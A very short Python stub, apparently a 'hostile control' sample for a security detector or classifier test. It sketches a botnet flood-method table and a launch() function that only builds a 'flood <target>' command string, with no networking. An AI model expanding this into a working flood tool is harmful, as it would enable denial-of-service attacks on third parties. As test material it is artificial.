"""Botnet flood-method table (hostile control)."""

ATTACK_METHODS = {
    "pan_attack": {"flag": "-p", "desc": "PAN attack traffic"},
    "pan-flood": {"flag": "--pan-flood", "desc": "PAN flood traffic"},
}


def launch(method, target):
    if method == "pan_attack":
        return f"flood {target} {ATTACK_METHODS[method]['flag']}"
    raise ValueError(method)
